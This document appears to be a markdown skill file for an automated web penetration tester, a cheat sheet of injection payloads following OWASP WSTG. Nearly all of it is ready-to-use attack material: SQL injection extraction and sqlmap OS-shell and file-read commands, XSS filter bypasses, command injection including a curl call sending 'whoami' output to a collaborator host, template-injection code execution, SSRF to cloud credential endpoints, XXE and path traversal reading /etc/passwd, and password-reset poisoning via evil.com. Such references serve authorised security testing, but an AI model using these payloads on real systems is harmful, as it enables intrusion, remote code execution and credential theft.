---
name: wstg-injection
description: WSTG input validation and injection testing - SQLi, XSS, SSTI, SSRF, command injection, XXE
tags: [injection, sqli, xss, ssti, ssrf, xxe, rce, wstg]
version: "1.0"
---

# Input Validation & Injection Testing (WSTG-INPV)

## SQL Injection

### Detection Payloads (test in every input)
```sql
'
''
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
" OR "1"="1" --
' AND 1=1 --
' AND 1=2 --
1' ORDER BY 1 --
1' ORDER BY 100 --
' UNION SELECT NULL --
```

### DB Fingerprinting (from error messages)
| Error Snippet | Database |
|---------------|----------|
| `You have an error in your SQL syntax` | MySQL |
| `pg_query()`, `PSQLException` | PostgreSQL |
| `Microsoft SQL Server`, `Unclosed quotation mark` | MSSQL |
| `ORA-`, `Oracle error` | Oracle |
| `SQLite` | SQLite |

### Union-Based Extraction
```sql
-- Step 1: Find column count
' ORDER BY 1 -- ... ' ORDER BY N --
' UNION SELECT NULL,NULL,... --

-- Step 2: Find displayable column
' UNION SELECT 'a',NULL,NULL --

-- Step 3: Extract data
-- MySQL:
' UNION SELECT table_name,NULL FROM information_schema.tables --
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT username,password FROM users --

-- MSSQL:
' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U' --

-- PostgreSQL:
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public' --
```

### Blind SQLi
```sql
-- Boolean-based
' AND 1=1 --  (true response)
' AND 1=2 --  (false response)
' AND SUBSTRING(username,1,1)='a' --
' AND (SELECT COUNT(*) FROM users)>0 --

-- Time-based
' AND SLEEP(5) --                        (MySQL)
'; WAITFOR DELAY '0:0:5' --              (MSSQL)
' AND pg_sleep(5) --                     (PostgreSQL)
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- (Oracle)
```

### sqlmap Quick Reference
```bash
# Basic scan
sqlmap -u "https://TARGET/page?id=1" --batch --random-agent

# POST request
sqlmap -u "https://TARGET/login" --data="user=admin&pass=test" -p user --batch

# With authentication
sqlmap -u "https://TARGET/page?id=1" --cookie="session=abc123" --batch

# Enumerate
sqlmap -u "URL" --dbs                    # List databases
sqlmap -u "URL" -D dbname --tables       # List tables
sqlmap -u "URL" -D db -T users --dump    # Dump table
sqlmap -u "URL" --current-user           # Current DB user
sqlmap -u "URL" --is-dba                 # Check DBA privs

# Advanced
sqlmap -u "URL" --os-shell               # OS shell
sqlmap -u "URL" --file-read=/etc/passwd  # Read files
sqlmap -u "URL" --tamper=space2comment,between  # WAF bypass
sqlmap -u "URL" --level=5 --risk=3       # Thorough scan
```

## Cross-Site Scripting (XSS)

### Reflected XSS Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
javascript:alert(1)
```

### Context-Specific Payloads
```html
<!-- Inside HTML attribute (break out) -->
" onmouseover="alert(1)
' onfocus='alert(1)' autofocus='

<!-- Inside script tag -->
';alert(1);//
</script><script>alert(1)</script>

<!-- Inside JavaScript string -->
\';alert(1);//
\"-alert(1)-\"

<!-- Inside URL/href -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>

<!-- Inside CSS -->
expression(alert(1))
url('javascript:alert(1)')
```

### Filter Bypass Techniques
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- Encoding -->
<script>alert&#40;1&#41;</script>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
%3Cscript%3Ealert(1)%3C/script%3E

<!-- No parentheses -->
<img src=x onerror=alert`1`>
<script>onerror=alert;throw 1</script>

<!-- No quotes/angle brackets -->
<svg/onload=alert(1)>
<img src=x onerror=alert(1)//>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E
```

### Stored XSS Targets
Test payload injection in: profile name/bio, comments, messages, forum posts, file names, email subjects, metadata fields, custom headers.

## Command Injection

### OS-Specific Payloads
```bash
# Linux
; id
| id
|| id
$(id)
`id`
; cat /etc/passwd
| whoami
& ping -c 1 COLLAB_SERVER &

# Windows
& ipconfig
| net user
; dir C:\
& ping -n 1 COLLAB_SERVER &

# Blind detection (use collaborator/webhook)
; curl http://COLLAB_SERVER/$(whoami)
| nslookup COLLAB_SERVER
; ping -c 1 COLLAB_SERVER
```

### Bypasses
```bash
# Space bypass
;{id}
;$IFS'id'
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Blacklist bypass
/bin/c?t /etc/p?sswd
c''a''t /etc/passwd
c\at /etc/passwd
```

## Server-Side Template Injection (SSTI)

### Detection Polyglot
```
${{<%[%'"}}%\.
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
```

### Engine-Specific Payloads
| Engine | Detection | RCE Payload |
|--------|-----------|-------------|
| Jinja2 (Python) | `{{7*7}}` → 49 | `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` |
| Twig (PHP) | `{{7*7}}` → 49 | `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}` |
| Freemarker (Java) | `${7*7}` → 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Pebble (Java) | `{{7*7}}` → 49 | `{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}` |
| ERB (Ruby) | `<%= 7*7 %>` → 49 | `<%= system("id") %>` |
| Smarty (PHP) | `{7*7}` → 49 | `{system('id')}` |
| Handlebars (JS) | `{{this}}` | `{{#with "s" as |string|}}...{{/with}}` |

## Server-Side Request Forgery (SSRF)

### Internal Target URLs
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0x7f000001
http://2130706433  (decimal)
http://017700000001  (octal)
http://127.1
```

### Cloud Metadata Endpoints
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data/

# GCP
http://metadata.google.internal/computeMetadata/v1/
(Header: Metadata-Flavor: Google)

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
(Header: Metadata: true)

# DigitalOcean
http://169.254.169.254/metadata/v1/
```

### SSRF Bypass Techniques
```
# URL encoding
http://127.0.0.1 → http://%31%32%37%2e%30%2e%30%2e%31

# DNS rebinding
Register DNS: evil.com → 169.254.169.254

# Redirect bypass
http://evil.com/redirect?url=http://169.254.169.254

# Protocol smuggling
gopher://127.0.0.1:6379/_SET%20key%20value
dict://127.0.0.1:6379/SET:key:value
```

## XML External Entity (XXE)

### Basic XXE
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```

### Blind XXE (OOB via HTTP)
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://COLLAB_SERVER/xxe">
  %xxe;
]>
```

### XXE via File Upload
Test in: SVG images, DOCX/XLSX/PPTX (unzip, inject in XML), SOAP requests, RSS feeds.

```xml
<!-- SVG XXE -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16">&xxe;</text>
</svg>
```

## LFI / Path Traversal

```bash
# Basic traversal
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
..%252f..%252f..%252fetc/passwd

# Windows
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows\win.ini

# Null byte (older PHP)
../../../etc/passwd%00
../../../etc/passwd%00.jpg

# Wrapper (PHP)
php://filter/convert.base64-encode/resource=index.php
php://input (POST body = PHP code)
expect://id
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
```

## Host Header Injection

```bash
# Basic
curl -H "Host: evil.com" https://TARGET/

# X-Forwarded-Host
curl -H "X-Forwarded-Host: evil.com" https://TARGET/

# Password reset poisoning
curl -X POST https://TARGET/forgot-password \
  -H "Host: evil.com" \
  -d "email=victim@target.com"
# Check if reset link uses evil.com
```

## HTTP Parameter Pollution

```bash
# Duplicate parameters
https://TARGET/page?id=1&id=2

# Server behavior varies:
# PHP/Apache: last value (id=2)
# ASP.NET/IIS: both (id=1,2)
# JSP/Tomcat: first value (id=1)
```

## Mass Assignment

```bash
# Add extra fields to updates
curl -X PUT https://TARGET/api/profile \
  -H "Content-Type: application/json" \
  -H "Cookie: session=USER_SESSION" \
  -d '{"name":"test","role":"admin","isAdmin":true,"verified":true}'

# Common fields to try:
# role, admin, isAdmin, is_admin, verified, active, permissions
# price, discount, balance, credits
# user_id, account_id, org_id
```

For detailed procedures on any test, read:
`knowledge/web-application/WSTG-INPV/WSTG-INPV-{NN}.md`
